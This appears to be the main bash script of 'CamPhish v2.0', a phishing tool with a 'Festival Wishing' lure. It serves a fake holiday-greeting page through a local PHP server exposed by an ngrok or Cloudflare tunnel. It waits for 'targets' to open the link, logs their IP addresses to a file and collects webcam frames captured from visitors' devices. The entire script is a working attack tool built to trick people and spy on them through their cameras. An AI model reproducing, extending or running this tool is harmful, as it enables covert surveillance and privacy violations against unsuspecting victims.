#!/bin/bash
# CamPhish v2.0 (Modified)
# Festival Wishing Template Only

# ─── Windows compatibility ────────────────────────────────────────────────────
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || \
   [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "Windows system detected."
  function killall() { taskkill /F /IM "$1" 2>/dev/null; }
  function pkill() {
    if [[ "$1" == "-f" ]]; then shift; shift; taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null;
    else taskkill /F /IM "$1" 2>/dev/null; fi
  }
else
  windows_mode=false
fi

trap 'printf "\n"; stop' 2

# ─── Banner ───────────────────────────────────────────────────────────────────
banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 2.0 \e[0m\n"
printf " \e[1;77m Festival Wishing Edition \e[0m\n"
printf "\n"
}

# ─── Dependencies ─────────────────────────────────────────────────────────────
dependencies() {
  command -v php > /dev/null 2>&1 || {
    echo >&2 "PHP is not installed. Run: pkg install php"
    exit 1
  }
}

# ─── Cleanup on exit ──────────────────────────────────────────────────────────
stop() {
  if [[ "$windows_mode" == true ]]; then
    taskkill /F /IM "ngrok.exe"       2>/dev/null
    taskkill /F /IM "php.exe"         2>/dev/null
    taskkill /F /IM "cloudflared.exe" 2>/dev/null
  else
    pkill -f ngrok       > /dev/null 2>&1
    pkill -f php         > /dev/null 2>&1
    pkill -f cloudflared > /dev/null 2>&1
    killall -2 ngrok       > /dev/null 2>&1
    killall -2 php         > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
  exit 1
}

# ─── Catch IP ─────────────────────────────────────────────────────────────────
catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
  cat ip.txt >> saved.ip.txt
}

# ─── Wait loop ────────────────────────────────────────────────────────────────
checkfound() {
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\e[1;77m Press Ctrl+C to exit\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Camera capture is \e[0m\e[1;93mACTIVE\e[0m\n"
  while true; do

    if [[ -e "ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
      catch_ip
      rm -f ip.txt
    fi

    if [[ -e "Log.log" ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] Cam frame received!\e[0m\n"
      rm -f Log.log
    fi

    sleep 0.5
  done
}

# ─── Cloudflare: download binary ──────────────────────────────────────────────
download_cloudflared() {
  command -v wget > /dev/null 2>&1 || { echo >&2 "wget not found. Run: pkg install wget"; exit 1; }

  arch=$(uname -m)
  os=$(uname -s)
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared (OS: $os, Arch: $arch)...\e[0m\n"

  if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate \
      https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe \
      -O cloudflared.exe > /dev/null 2>&1
    [[ -e cloudflared.exe ]] && chmod +x cloudflared.exe || { printf "[!] Download failed\n"; exit 1; }
    printf '#!/bin/bash\n./cloudflared.exe "$@"\n' > cloudflared
    chmod +x cloudflared

  elif [[ "$os" == "Darwin" ]]; then
    [[ "$arch" == "arm64" ]] && \
      url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz" || \
      url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
    wget --no-check-certificate "$url" -O cloudflared.tgz > /dev/null 2>&1
    tar -xzf cloudflared.tgz > /dev/null 2>&1 && chmod +x cloudflared && rm -f cloudflared.tgz \
      || { printf "[!] Download failed\n"; exit 1; }

  else
    case "$arch" in
      "x86_64")          dl="cloudflared-linux-amd64" ;;
      "i686"|"i386")     dl="cloudflared-linux-386"   ;;
      "aarch64"|"arm64") dl="cloudflared-linux-arm64"  ;;
      "armv7l"|"armv6l") dl="cloudflared-linux-arm"    ;;
      *)                 dl="cloudflared-linux-amd64" ;;
    esac
    wget --no-check-certificate \
      "https://github.com/cloudflare/cloudflared/releases/latest/download/$dl" \
      -O cloudflared > /dev/null 2>&1
    [[ -e cloudflared ]] && chmod +x cloudflared || { printf "[!] Download failed\n"; exit 1; }
  fi
}

# ─── Cloudflare tunnel ────────────────────────────────────────────────────────
cloudflare_tunnel() {
  [[ -e cloudflared ]] || [[ -e cloudflared.exe ]] || download_cloudflared

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\e[0m\n"
  rm -f .cloudflared.log

  if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
  else
    ./cloudflared tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
  fi

  # Retry loop — up to 60 seconds (important on slow Android/Termux connections)
  link=""
  max_wait=60
  waited=0
  printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for tunnel URL"
  while [[ -z "$link" && $waited -lt $max_wait ]]; do
    sleep 2
    waited=$((waited + 2))
    printf "."
    if [[ -e ".cloudflared.log" ]]; then
      link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' ".cloudflared.log" | head -n1)
      [[ -z "$link" ]] && link=$(grep -oE 'https://[^ "]+trycloudflare[^ "]+' ".cloudflared.log" | head -n1)
    fi
  done
  printf "\n"

  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Could not get tunnel URL. Possible reasons:\e[0m\n"
    printf "\e[1;93m    - CloudFlare service is down\e[0m\n"
    printf "\e[1;93m    - On Android: enable hotspot\e[0m\n"
    printf "\e[1;93m    - Cloudflared already running: killall cloudflared\e[0m\n"
    printf "\e[1;93m    - Check internet connection\e[0m\n"
    printf "\e[1;93m    - Debug: cat .cloudflared.log\e[0m\n"
    exit 1
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
  payload_cloudflare "$link"
  checkfound
}

# ─── Ngrok: download binary ───────────────────────────────────────────────────
download_ngrok() {
  command -v wget  > /dev/null 2>&1 || { echo >&2 "wget not found. Run: pkg install wget";  exit 1; }
  command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip not found. Run: pkg install unzip"; exit 1; }

  arch=$(uname -m)
  os=$(uname -s)
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok (OS: $os, Arch: $arch)...\e[0m\n"
  base="https://bin.equinox.io/c/bNyj1mQVY4c"

  if [[ "$windows_mode" == true ]]; then
    wget --no-check-certificate "$base/ngrok-v3-stable-windows-amd64.zip" -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok.exe && rm -f ngrok.zip \
      || { printf "[!] Download failed\n"; exit 1; }

  elif [[ "$os" == "Darwin" ]]; then
    [[ "$arch" == "arm64" ]] && zf="ngrok-v3-stable-darwin-arm64.zip" || zf="ngrok-v3-stable-darwin-amd64.zip"
    wget --no-check-certificate "$base/$zf" -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok && rm -f ngrok.zip \
      || { printf "[!] Download failed\n"; exit 1; }

  else
    case "$arch" in
      "x86_64")          zf="ngrok-v3-stable-linux-amd64.zip" ;;
      "i686"|"i386")     zf="ngrok-v3-stable-linux-386.zip"   ;;
      "aarch64"|"arm64") zf="ngrok-v3-stable-linux-arm64.zip"  ;;
      "armv7l"|"armv6l") zf="ngrok-v3-stable-linux-arm.zip"    ;;
      *)                 zf="ngrok-v3-stable-linux-amd64.zip" ;;
    esac
    wget --no-check-certificate "$base/$zf" -O ngrok.zip > /dev/null 2>&1
    unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok && rm -f ngrok.zip \
      || { printf "[!] Download failed\n"; exit 1; }
  fi
}

# ─── Ngrok tunnel ─────────────────────────────────────────────────────────────
ngrok_server() {
  [[ -e ngrok ]] || [[ -e ngrok.exe ]] || download_ngrok

  # Auth token
  if [[ "$windows_mode" == true ]]; then
    local cfg="$USERPROFILE\.ngrok2\ngrok.yml"
  else
    local cfg="$HOME/.ngrok2/ngrok.yml"
  fi

  if [[ -e "$cfg" ]]; then
    printf "\e[1;93m[\e[0m*\e[1;93m] Existing ngrok config found.\e[0m\n"
    read -p $'\e[1;92m[\e[0m+\e[1;92m] Change authtoken? [y/N]: \e[0m' chg_token
    if [[ $chg_token == "Y" || $chg_token == "y" ]]; then
      read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
      [[ "$windows_mode" == true ]] && ./ngrok.exe authtoken "$ngrok_auth" > /dev/null 2>&1 \
                                    || ./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
    fi
  else
    read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
    [[ "$windows_mode" == true ]] && ./ngrok.exe authtoken "$ngrok_auth" > /dev/null 2>&1 \
                                  || ./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok tunnel...\e[0m\n"
  [[ "$windows_mode" == true ]] && ./ngrok.exe http 3333 > /dev/null 2>&1 & \
                                 || ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 10

  link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oE 'https://[^"]*\.ngrok-free\.app' | head -n1)
  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Could not get Ngrok URL. Possible reasons:\e[0m\n"
    printf "\e[1;93m    - Invalid authtoken\e[0m\n"
    printf "\e[1;93m    - On Android: enable hotspot\e[0m\n"
    printf "\e[1;93m    - Ngrok already running: killall ngrok\e[0m\n"
    printf "\e[1;93m    - Try manually: ./ngrok http 3333\e[0m\n"
    exit 1
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
  payload_ngrok "$link"
  checkfound
}

# ─── Payload builders ─────────────────────────────────────────────────────────
payload_cloudflare() {
  local link="$1"
  # Build index.php (landing/redirect page)
  sed "s+forwarding_link+${link}+g" template.php > index.php
  # Build index2.html (festival wishing page)
  sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html
  sed "s+fes_name+${fest_name}+g"   index3.html         > index2.html
  rm -f index3.html
}

payload_ngrok() {
  local link="$1"
  sed "s+forwarding_link+${link}+g" template.php > index.php
  sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html
  sed "s+fes_name+${fest_name}+g"   index3.html         > index2.html
  rm -f index3.html
}

# ─── Main ─────────────────────────────────────────────────────────────────────
camphish() {
  [[ -e sendlink ]] && rm -f sendlink

  # Ask festival name
  read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Enter festival name (e.g. Diwali, Eid, Holi): \e[0m' fest_name
  fest_name="${fest_name//[[:space:]]/}"
  if [[ -z "$fest_name" ]]; then
    printf "\e[1;93m[!] Festival name cannot be empty.\e[0m\n"
    camphish
    return
  fi

  # Choose tunnel
  printf "\n\e[1;92m-----Choose tunnel server-----\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
  read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Choose [Default: 2]: \e[0m' option_server
  option_server="${option_server:-2}"

  if [[ $option_server -eq 2 ]]; then
    cloudflare_tunnel
  elif [[ $option_server -eq 1 ]]; then
    ngrok_server
  else
    printf "\e[1;93m[!] Invalid option.\e[0m\n"
    sleep 1
    camphish
  fi
}

banner
dependencies
camphish
